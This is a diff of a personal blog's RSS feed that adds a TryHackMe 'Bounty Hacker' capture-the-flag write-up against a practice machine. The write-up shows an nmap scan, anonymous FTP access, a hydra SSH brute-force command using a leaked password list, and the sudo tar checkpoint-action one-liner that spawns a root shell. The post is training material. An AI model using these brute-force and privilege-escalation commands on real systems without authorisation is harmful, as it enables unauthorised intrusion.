@@ -5,8 +5,98 @@
         <description>Recent content in Posts on Natan Maia Morette</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 14 Aug 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Sun, 15 Aug 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>TryHackme - Bounty Hacker - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</link>
+            <pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</guid>
+            <description>First of all, let&amp;rsquo;s nmap the machine IP.
+└─$ sudo nmap -sS -Pn 10.10.207.23 [sudo] password for venomsnake: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 07:43 -03 Nmap scan report for 10.10.207.23 Host is up (0.20s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 9.</description>
+            <content type="html"><![CDATA[
+    <img src="/images/tryhackme/bountyhacker/banner.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.207.23</span>
+[sudo] password <span style="color:#66d9ef">for</span> venomsnake: 
+Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
+Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-15 07:43 -03
+</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.207.23</span>
+Host is up (<span style="color:#ae81ff">0.20</span>s latency).
+Not shown: <span style="color:#ae81ff">967</span> filtered ports, <span style="color:#ae81ff">30</span> closed ports
+PORT   STATE SERVICE
+<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp open  ftp
+<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh
+<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http
+
+Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">9.46</span> seconds
+</code></pre></div><p>We found three open ports: 21,22 and 80. The next step is enumerate these ports:</p>
+<h2 id="http-80">HTTP 80</h2>
+
+    <img src="/images/tryhackme/bountyhacker/80.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>We found a text introduction in the web page.</p>
+<p>Let&rsquo;s use digobuster for dig more info:</p>
+
+    <img src="/images/tryhackme/bountyhacker/dirbuster.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Unfortunelly we don&rsquo;t find usefull information.</p>
+<h2 id="ftp-21">FTP 21</h2>
+<p>Le&rsquo;ts try a anonymous login into the ftp server:</p>
+
+    <img src="/images/tryhackme/bountyhacker/ftp.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>It&rsquo;s working!</p>
+<p>We found 2 files in the server: <code>task.txt</code> with the answer for the question: <em>&ldquo;Who wrote the task list?&quot;</em>. 
+The other file <code>locks.txt</code> looks like a list of passwords.
+Now we have a users name and a list of possible passwords, we could try to brute force the port 22.</p>
+<h2 id="ssh-22">SSH 22</h2>
+<p>Let&rsquo;s use <code>hydra</code> with a lista of users. We found a user in the file <code>task.txt</code> but just in case we could use a lista of possible users.</p>
+
+    <img src="/images/tryhackme/bountyhacker/users.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hydra <span style="color:#f92672">-</span>v <span style="color:#f92672">-</span>L users.txt <span style="color:#f92672">-</span>P locks.txt <span style="color:#ae81ff">10.10.207.23</span> ssh <span style="color:#f92672">-</span>t <span style="color:#ae81ff">4</span>
+</code></pre></div>
+    <img src="/images/tryhackme/bountyhacker/ssh.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>We got the lin&rsquo;s password to ssh.</p>
+<p>Finally we could have access to the host:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssh lin<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.207.23</span>
+</code></pre></div><p>Now we&rsquo;re looking for the <code>users.txt</code> file:</p>
+
+    <img src="/images/tryhackme/bountyhacker/txt.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>The next step is find the <code>root.txt</code> file, but the user lin isn&rsquo;t in the sudoers group.
+So we need to find some way to privesc this host.</p>
+<p>Checking what we can run with <code>sudo -l</code>:</p>
+
+    <img src="/images/tryhackme/bountyhacker/sudo.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Let’s check our best friend GTFOBIns by going to <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p>
+
+    <img src="/images/tryhackme/bountyhacker/tar.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>We have a possible privesc with tar:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo tar <span style="color:#f92672">-</span>cf <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">-</span>action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=/</span>bin<span style="color:#f92672">/</span>sh
+</code></pre></div><p>That&rsquo;s it! We&rsquo;re root!</p>
+
+    <img src="/images/tryhackme/bountyhacker/root.png"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>HTB - Blue- Write Up</title>
@@ -122,7 +212,7 @@ Search for &ldquo;ms17-010&rdquo; and use the module: scanner/smb/smb_ms17_010:<
 
 <p>Search for the flag in the commons users folders.</p>
 
-    <img src="/images/htb/blue/pawnd.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/blue/pawnd.PNG"  class="center"  style="border-radius: 8px;"  />
 
 
 ]]></content>
